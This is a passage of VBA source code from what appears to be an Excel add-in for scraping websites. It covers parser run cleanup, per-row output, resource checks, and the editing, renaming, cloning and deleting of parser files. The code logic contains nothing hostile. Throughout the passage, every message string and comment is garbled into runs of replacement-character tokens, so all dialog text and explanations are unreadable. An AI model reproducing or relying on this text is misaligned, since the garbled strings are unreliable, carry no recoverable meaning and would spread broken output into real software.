                AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & Me.MainWorkbookPath, bt_Warning
                GoTo ExitParserLabel
            End If
        End If
        
        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        sheet_name$ = Trim(Render(Me.Options.Workbook_Sheetname))
        PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & sheet_name$ & "|fffd|"
        
        If Me.Options.Workbook_Sheet And (sheet_name$ <> "") Then
            Set shd = WB.Worksheets(CStr(sheet_name$))
            If shd Is Nothing Then Set shd = AddNewWorksheet(WB, sheet_name$)
        Else
            Set shd = WB.Worksheets(1)
        End If
        
        If shd Is Nothing Then
            AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & sheet_name$ & "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| " & vbNewLine & Me.MainWorkbookPath, bt_Warning
            GoTo ExitParserLabel
        End If
        
        Set Me.Sheet = shd
        PrInd1.ShowMessage ""
        If DESCRIPTION_MODE Then
            DescriptionText = DescriptionText & "<br />" & "<table class=""parser-prepare-sheet parser-table""><thead><tr><th><div class=""parser-table-header"">" & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel" & "</div></th></tr></thead><tbody></table>"        '& "<br />"
        End If
    Else
        If Me.Columns.Enabled And Me.Columns.SheetOptions.CreateNewWorkbook Then
            PrInd1.ShowMessage tt("PI_Parser_CreatingNewWorkbook") & " ..."
            Set Me.Sheet = Workbooks.Add(xlWBATWorksheet).Worksheets(1)
            Me.Sheet.Name = DEFAULT_SHEET_NAME$
            PrInd1.ShowMessage ""
            If DESCRIPTION_MODE Then
                DescriptionText = DescriptionText & "<br />" & "<table class=""parser-prepare-sheet parser-table""><thead><tr><th><div class=""parser-table-header"">" & _
                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel" & "</div></th></tr></thead><tbody></table>"        '& "<br />"
            End If
        Else
            Set Me.Sheet = ActiveSheet
        End If
    End If
    
    Me.Sheet.Parent.Activate
    Me.Sheet.Activate
    
    PrInd1_top& = Me.PrInd1.FP.Top
    Me.PrInd1.FP.Show        ' |fffd||fffd||fffd| Excel 2013 |fffd| |fffd||fffd||fffd||fffd||fffd|
    Me.PrInd1.FP.Top = PrInd1_top&
    If SHOW_PI2 Then Me.PrInd2.FP.Show
    
    If Me.Options.NeedsOpenedWorkbook Then
        If Me.Sheet Is Nothing Then
            Me.PrInd2.Hide: Me.PrInd1.Hide
            Application.ScreenUpdating = True
            MsgBox tt("PI_Parser_NoSourceFile"), vbCritical, tt("PI_Parser_ErrMsg_Caption")
            GoTo ExitParserLabel
        End If
    End If
    
    ParserVariables.item("{filename}") = Split(Me.Sheet.Parent.Name, ".xls")(0)
    ParserVariables.item("{sheetname}") = Me.Sheet.Name
    ParserVariables.Add "{addinfolder}", ThisWorkbook.Path & "\"
    If Me.Downloads.Enabled Then Me.Downloads.SaveFoldersInVariables
    
    
    If SHOW_PI2 Then Me.PrInd2.Show "", 1: Me.PrInd2.CancelButton.Visible = False
    
    If Me.Columns.Enabled Then Me.Columns.SheetOptions.PrepareSheet , True
    Application.ScreenUpdating = True
    For i = 1 To 1000
        DoEvents
    Next
    If Not ParserVariables.Exists("ScreenUpdatingMode") Then Application.ScreenUpdating = False
    
    Me.PrInd1.line1 = tt("PI_Parser_OnStart")
    Me.AASets.GetItemByName(ACTION_SET_NAME_ONSTART$).Execute
    
    Me.PrInd1.line1 = tt("PI_ProcessingData")
    Me.SourceData.Execute
    If Me.Columns.FastOutputEnabled Then Me.Columns.FO_SwitchToNextRow True
    
    If Me.Downloads.Enabled Then If Not DESCRIPTION_MODE Then Me.Downloads.OpenDownloadFolders
    
    If Me.Options.RunParserFinishOnBreak And StopMacro Then StopMacro = False: TemporaryDisableStopMacro = True
    Me.PrInd1.StartNewActionNew 99, 100, tt("PI_Parser_OnFinish")
    Me.AASets.GetItemByName(ACTION_SET_NAME_ONFINISH$).Execute
    
    If Me.Options.Workbook_Save Then     ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel
        If Me.MainWorkbookPath = "" Then
            Me.MainWorkbookPath = GetMainWorkbookPath
            If Me.MainWorkbookPath <> "" Then
                Application.DisplayAlerts = False
                Me.Sheet.Parent.SaveAs Me.MainWorkbookPath, FileFormatByExtension(FWF.GetFileExtension(Me.MainWorkbookPath))
                Application.DisplayAlerts = True
            End If
        Else
            Set WB = ConnectToWorkbookByFilename(Me.MainWorkbookPath)
            WB.Save
        End If
    End If
    
    If TemporaryDisableStopMacro Then StopMacro = True
    
    Me.PrInd1.StartNewActionNew 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd|"
    
ExitParserLabel:
    Me.PrInd2.Hide
    Set Me.PrInd1.Parent = Nothing
    Me.PrInd1.Hide
    If Not Me.ExternalStart Then STick& = 0
    OLIM = prevOLIM&: toi& = prev_toi&
    If Me.Columns.SearchForRow Then shtr.Cells.Find "*", , xlValues, xlPart
    If Not Me.ExternalStart Then If Me.Options.ClearDictionaries Then ClearDictionaries
    
    Set RunningParser = Nothing
    Err.Clear: Set GlobalError = Nothing: Set WB = Nothing
    Application.ScreenUpdating = True
End Sub

Sub ExecuteForValue(ByRef txt)
    On Error Resume Next
    Static RowsCount&: RowsCount& = RowsCount& + 1
    Static ScreenUpdatingInterval&
    If ScreenUpdatingInterval& = 0 Then ScreenUpdatingInterval& = Me.Columns.SheetOptions.ScreenUpdatingInterval
    If ScreenUpdatingInterval& = 0 Then ScreenUpdatingInterval& = 1
    
    Dim destCell As Range, FO As Boolean
    FO = Me.Columns.FastOutputEnabled    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Columns.SearchForRow = TRUE
    
    If FO Then
        Set RowVariables = New Dictionary
    Else
        Set destCell = Me.SourceData.ActiveItem.GetDestinationCell
        FillRowVariables destCell, Me.SourceData.ActiveItem
    End If
    
    If SHOW_PI2 Then Me.PrInd2.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    If SHOW_PI2 Then Me.PrInd2.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", , ValueDescription(txt)
    
    Set MacroDestinationRange = destCell
    If Me.Columns.Enabled Then
        Me.Columns.ExecuteAll txt, destCell
        
        If Not FO Then
            If RowsCount& Mod ScreenUpdatingInterval& = 0 Then
                If Me.Columns.SheetOptions.ScrollWorksheet Then If (RowsCount& Mod 10 = 0) Or (RowsCount& = 1) Then ActiveWindow.ScrollRow = destCell.row - 8
                If Not ParserVariables.Exists("ScreenUpdatingMode") Then Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
            End If
        End If
    End If
    
    Set MacroDestinationRange = destCell
    Me.Downloads.ExecuteAll txt
    
    Set destCell = Nothing
End Sub

Function IsCorrect(Optional ByRef msg$) As Boolean
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    IsCorrect = True
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim res, AbsentResFileList$, ResFileExists As Boolean
    For Each res In Me.Options.ResourceFileList.Keys
        ResFileExists = All_RF.FileExist(res)
        If Not ResFileExists Then AbsentResFileList$ = AbsentResFileList$ & IIf(AbsentResFileList$ = "", "", "; ") & res
    Next res
    If Len(AbsentResFileList$) Then
        IsCorrect = False
        msg$ = msg$ & IIf(msg$ = "", "", vbNewLine) & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & AbsentResFileList$
    End If
    
End Function

Function IsBuiltIn() As Boolean
    On Error Resume Next
    IsBuiltIn = Not (Me.ParentSheet Is Nothing)
End Function

Sub Activate()
    On Error Resume Next
    CURRENT_PARSER$ Me.Name
    UpdateAddinToolbar
End Sub

Sub Edit()
    On Error Resume Next
    Dim FO As Object, t&, l&
    Set RunningParser = Me
    Me.SourceData.FOUND_COLUMN_NUMBER = 0
    
    For Each FO In UserForms
        If FO.Caption Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|* |fffd|" & Me.Name & "|fffd|" Then
            FO.Show
            Exit Sub
        End If
    Next
    
    Dim WPE_Form As Object        ' UserForm
    Static FormsColl As Collection        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel
    Set ParserVariables = Nothing    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    If SETT.GetBoolean("CheckBox_MultiParsersEditMode") Then
        Set WPE_Form = New F_ParserSettings_Edit
        If FormsColl Is Nothing Then Set FormsColl = New Collection
        FormsColl.Add WPE_Form
    Else
        Set WPE_Form = F_ParserSettings_Edit
    End If
    
    Me.Proxy.Apply
    Me.Resources.Initialize
    
    With WPE_Form
        .Show 0
        Set .ActiveParser = Me
        .FillActiveParserValues
        t& = .Top
        l& = .Left
        .Hide
        .StartUpPosition = 0
        .Top = t& + 20 * (UserForms.Count - 1)
        .Left = l& + 20 * (UserForms.Count - 1)
        .Show
        UserForm_AddCollapseButton .Caption
        .LockParserEditForm
    End With
End Sub

Function Rename(Optional ByVal NewName$)
    On Error Resume Next
    Dim OldFilename$, oldName$, msg$, res, NewFilename$
    OldFilename$ = Me.FileName
    oldName$ = Me.Name
    
    If Len(Me.Name) > 0 Then
        If Not Me.Saved Then
            msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
            Select Case MsgBox(msg$, vbYesNoCancel + vbDefaultButton1 + vbQuestion, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
                Case vbYes: Me.Save
                Case vbNo:    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                Case vbCancel: Exit Function
            End Select
        End If
    End If
    
InputNameRename:
    NewName$ = GetNewName(NewName$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
    If NewName$ = "" Then Exit Function
    NewFilename$ = PARSERS_FOLDER$ & NewName$ & PARSER_EXT$
    
    If Me.IsBuiltIn Then
        Me.Name = NewName$
        Exit Function
    End If
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Err.Clear
    Me.SaveAs NewFilename$
    If Err Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & NewFilename$ & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & NewName$ & "|fffd|" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbExclamation + vbYesNo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
            Case vbYes: NewName$ = "": GoTo InputNameRename
            Case vbNo: Exit Function
        End Select
    End If
    Kill OldFilename$
    Me.Name = NewName$
    Me.FileName = NewFilename$
    Me.Save
    If CURRENT_PARSER$ = oldName$ Then CURRENT_PARSER$ NewName$: UpdateAddinToolbar
End Function

Function GetNewName(Optional ByVal NewName$, Optional ByVal MsgTitle$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim msg$, NewFilename$, res As Variant
GetName:
    If Trim(NewName$) = "" Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & PARSER_EXT$ & ")." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        res = Application.InputBox(msg, MsgTitle$, Me.Name, , , , , 2)
        If VarType(res) = vbBoolean Then Exit Function
        NewName$ = CStr(res)
        If Trim(NewName$) = "" Then
            MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbExclamation, MsgTitle$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            GoTo GetName
        End If
    End If
    
    If NewName$ Like "*://?*" Then NewName$ = Split(NewName$, "://")(1)
    NewName$ = FWF.Replace_symbols(Split(NewName$, "/")(0))
    
    If Me.Name = NewName$ Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & NewName$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbOKCancel + vbDefaultButton2 + vbQuestion, MsgTitle$)
            Case vbOK: NewName$ = "": GoTo GetName        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Case vbCancel: Exit Function
        End Select
    End If
    
    
    NewFilename$ = PARSERS_FOLDER$ & NewName$ & PARSER_EXT$
    If Dir(NewFilename$, vbNormal) <> "" Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & NewName$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbYesNoCancel + vbDefaultButton2 + vbQuestion, MsgTitle$)
            Case vbYes:    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Case vbNo: NewName$ = "": GoTo GetName
            Case vbCancel: Exit Function
        End Select
    End If
    
    GetNewName = NewName$
End Function

Function ReadyToPublish() As Boolean
    On Error Resume Next: Dim msg$
    If Not Me.Saved Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbYesNoCancel + vbDefaultButton1 + vbQuestion, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
            Case vbYes: Me.Save
            Case vbNo:    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Case vbCancel: Exit Function
        End Select
    End If
    ReadyToPublish = True
End Function

Function Clone(Optional ByVal NewName$) As WebsiteParser
    Dim msg$, NewFilename$, res As Variant
    On Error Resume Next
    If Len(Me.Name) > 0 Then
        If Not Me.Saved Then
            msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
            Select Case MsgBox(msg, vbYesNoCancel + vbDefaultButton1 + vbQuestion, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
                Case vbYes: Me.Save
                Case vbNo:    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                Case vbCancel: Exit Function
            End Select
        End If
    End If
    
InputCloneName:
    NewName$ = GetNewName(NewName$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
    If NewName$ = "" Then Exit Function
    If NewName$ = "selection" Then
        Dim coll As New Collection, cell As Range, pn$
        For Each cell In Intersect(Selection, ActiveSheet.UsedRange).Cells
            pn$ = "": pn$ = CStr(FWF.Replace_symbols(Split(Replace(Trim(cell), "http://", ""), "/")(0)))
            If Len(pn$) Then coll.Add pn$, pn$
        Next cell
        If coll.Count > 1 Then
            Me.Clone_Multi coll
            Set Clone = New WebsiteParser
            Clone.Name = "close form"
            Exit Function
        End If
    End If
    NewFilename$ = PARSERS_FOLDER$ & NewName$ & PARSER_EXT$
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Dim WP As New WebsiteParser: Set WP = Me: Err.Clear
    
    WP.Name = NewName$
    WP.BuildIn = False
    Set WP.ParentSheet = Nothing
    
    WP.SaveAs NewFilename$
    If Err Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & NewFilename$ & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & NewName$ & "|fffd|" & NewFilename$ & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbExclamation + vbYesNo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
            Case vbYes: GoTo InputCloneName
            Case vbNo: Exit Function
        End Select
    End If
    WP.FileName = NewFilename$
    WP.Name = NewName$
    
    Set Clone = WP
End Function

Sub Clone_Multi(ByVal ParserNames As Collection)
    On Error Resume Next
    Dim pn As Variant, NewName$, msg$, NewFilename$, nOK&, nERR&, nEXIST&
    For Each pn In ParserNames
        NewName$ = CStr(pn)
        NewFilename$ = PARSERS_FOLDER$ & NewName$ & PARSER_EXT$
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        
        Me.Name = NewName$
        Me.BuildIn = False
        Set Me.ParentSheet = Nothing
        
        If Dir(NewFilename$, vbNormal) <> "" Then
            nEXIST& = nEXIST& + 1
        Else
            Err.Clear
            Me.SaveAs NewFilename$
            If Err Then
                msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & NewFilename$ & vbNewLine & vbNewLine & _
                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & NewName$ & "|fffd|" & NewFilename$
                nERR& = nERR& + 1: Debug.Print "Error cloning parser: " & NewName$
            Else
                nOK& = nOK& + 1
            End If
            Me.FileName = NewFilename$
            Me.Name = NewName$
        End If
    Next
    
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nOK& & vbNewLine & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nEXIST& & vbNewLine & _
        "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nERR&, vbInformation
    
    UpdateAddinToolbar
    GetCommandBar(PROJECT_NAME).Controls(1).ListIndex = 0
End Sub

Sub Delete()
    Dim msg$
    On Error Resume Next
    If Me.IsBuiltIn Then
        DeleteAllHiddenNames Me.ParentSheet
        Exit Sub
    End If
    
    If Len(Me.Name) > 0 Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbYesNo + vbDefaultButton2 + vbQuestion, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
